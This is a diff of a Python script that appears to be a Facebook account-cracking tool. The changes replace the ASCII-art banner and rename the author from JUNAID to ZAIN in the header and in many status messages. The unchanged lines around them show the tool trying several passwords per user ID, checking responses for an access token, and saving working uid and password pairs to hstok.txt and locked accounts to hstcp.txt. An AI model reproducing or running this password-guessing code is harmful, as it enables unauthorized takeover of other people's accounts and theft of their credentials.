@@ -756,21 +756,24 @@ logo ="""
 
    ooooooooooooo oooooooooo.   .oooooo..o
 
-   8'   888   `8 `888'   `Y8b d8P'    `Y8 
+   
+                 
+ 
+  ______.        _____. ____
+ |___  /   /\   |_   _| \ | |
+    / /   /  \    | | |  \| |       .      
+   / /   / /\ \   | | | . ` |
+  / /__ / ____ \ _| |_| |\  |.  
+ /_____/_/    \_\_____|_| \_|
+______________________________
+______________________________
+______________________________
 
-        888       888     888 Y88bo.      
 
-         888       888oooo888'  `"Y8888o.  
-
-        888       888    `88b      `"Y88b 
-
-        888       888    .88P oo     .d8P 
-
-       o888o     o888bood8P'  8""88888P'  
 
  ------------------------------------------
 
-   Author   : JUNAID BALOCH
+   Author   : ZAIN BALOCH
 
    Github   :https://github.com/Junaidbaloch112
 
@@ -1320,7 +1323,7 @@ def crack_select():
 
 			if "access_token" in q:
 
-				print(" \033[1;32m [TBS-JUNAID "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [TBS-ZAIN "+uid+" | "+pass1+"\033[0;97m")
 
 				ok = open("hstok.txt", "a")
 
@@ -1334,7 +1337,7 @@ def crack_select():
 
 				if "www.facebook.com" in q["error_msg"]:
 
-					print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [TBS_ZAIN] "+uid+" | "+pass1+"\033[0;97m")
 
 					cp = open("hstcp.txt", "a")
 
@@ -1354,7 +1357,7 @@ def crack_select():
 
 					if "access_token" in q:
 
-						print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [TBS-ZAIN] "+uid+" | "+pass2+"\033[0;97m")
 
 						ok = open("hstok.txt", "a")
 
@@ -1368,7 +1371,7 @@ def crack_select():
 
 						if "www.facebook.com" in q["error_msg"]:
 
-							print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [TBS_ZAIN] "+uid+" | "+pass2+"\033[0;97m")
 
 							cp = open("hstcp.txt", "a")
 
@@ -1388,7 +1391,7 @@ def crack_select():
 
 							if "access_token" in q:
 
-								print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [TBS-ZAIN] "+uid+" | "+pass3+"\033[0;97m")
 
 								ok = open("hstok.txt", "a")
 
@@ -1402,7 +1405,7 @@ def crack_select():
 
 								if "www.facebook.com" in q["error_msg"]:
 
-									print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [TBS_ZAIN] "+uid+" | "+pass3+"\033[0;97m")
 
 									cp = open("hstcp.txt", "a")
 
@@ -1422,7 +1425,7 @@ def crack_select():
 
 									if "access_token" in q:
 
-										print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m [TBS-ZAIN] "+uid+" | "+pass4+"\033[0;97m")
 
 										ok = open("hstok.txt", "a")
 
@@ -1436,7 +1439,7 @@ def crack_select():
 
 										if "www.facebook.com" in q["error_msg"]:
 
-											print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m [TBS_ZAIN] "+uid+" | "+pass4+"\033[0;97m")
 
 											cp = open("hstcp.txt", "a")
 
@@ -1456,7 +1459,7 @@ def crack_select():
 
 											if "access_token" in q:
 
-												print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m [TBS-ZAIN] "+uid+" | "+pass5+"\033[0;97m")
 
 												ok = open("hstok.txt", "a")
 
@@ -1470,7 +1473,7 @@ def crack_select():
 
 												if "www.facebook.com" in q["error_msg"]:
 
-													print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m [TBS-ZAIN] "+uid+" | "+pass5+"\033[0;97m")
 
 													cp = open("hstcp.txt", "a")
 
@@ -1724,7 +1727,7 @@ def choice_select():
 
 			if "access_token" in q:
 
-				print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [TBS-ZAIN] "+uid+" | "+pass1+"\033[0;97m")
 
 				ok = open("hstok.txt", "a")
 
@@ -1738,7 +1741,7 @@ def choice_select():
 
 				if "www.facebook.com" in q["error_msg"]:
 
-					print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [TBS_ZAIN] "+uid+" | "+pass1+"\033[0;97m")
 
 					cp = open("hstcp.txt", "a")
 
@@ -1756,7 +1759,7 @@ def choice_select():
 
 					if "access_token" in q:
 
-						print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [ZAIN-CP] "+uid+" | "+pass2+"\033[0;97m")
 
 						ok = open("hstok.txt", "a")
 
@@ -1770,7 +1773,7 @@ def choice_select():
 
 						if "www.facebook.com" in q["error_msg"]:
 
-							print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [ZAIN-OK] "+uid+" | "+pass2+"\033[0;97m")
 
 							cp = open("hstcp.txt", "a")
 
@@ -1788,7 +1791,7 @@ def choice_select():
 
 							if "access_token" in q:
 
-								print(" \033[1;32m [TBS-JUNAID] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [ZAIN-CP] "+uid+" | "+pass3+"\033[0;97m")
 
 								ok = open("hstok.txt", "a")
 
@@ -1802,7 +1805,7 @@ def choice_select():
 
 								if "www.facebook.com" in q["error_msg"]:
 
-									print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [ZAIN-OK] "+uid+" | "+pass3+"\033[0;97m")
 
 									cp = open("hstcp.txt", "a")
 
@@ -1908,7 +1911,7 @@ def ran():
 
 			if "access_token" in q:
 
-				print(" \033[1;32m[TBS_JUNAID] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m[ZAIN-CP] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
 
 				ok = open("hstok.txt", "a")
 
@@ -1922,7 +1925,7 @@ def ran():
 
 				if "www.facebook.com" in q["error_msg"]:
 
-					print(" \033[1;33m [TBS_JUNAID] "+k+co+user+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [ZAIN-OK] "+k+co+user+" | "+pass1+"\033[0;97m")
 
 					cp = open("hstcp.txt", "a")
 
@@ -1942,7 +1945,7 @@ def ran():
 
 					if "access_token" in q:
 
-						print(" \033[1;32m[TBS_JUNAID] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m[ZAIN-CP] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
 
 						ok = open("hstok.txt", "a")
 
@@ -1956,7 +1959,7 @@ def ran():
 
 						if "www.facebook.com" in q["error_msg"]:
 
-							print(" \033[1;33m [TBS_JUNAID] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [ZAIN-OK] "+uid+" | "+pass2+"\033[0;97m")
 
 							cp = open("hstcp.txt", "a")
 
@@ -1976,7 +1979,7 @@ def ran():
 
 							if "access_token" in q:
 
-								print(" \033[1;32m[TBS_JUNAID] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+								print(" \033[1;32m[ZAIN-CP] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
 
 								ok = open("hstok.txt", "a")
 
@@ -1990,7 +1993,7 @@ def ran():
 
 								if "www.facebook.com" in q["error_msg"]:
 
-									print(" \033[1;33m [TBS_JUNAID] "+k+co+user+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [ZAIN-OK] "+k+co+user+" | "+pass3+"\033[0;97m")
 
 									cp = open("hstcp.txt", "a")
 
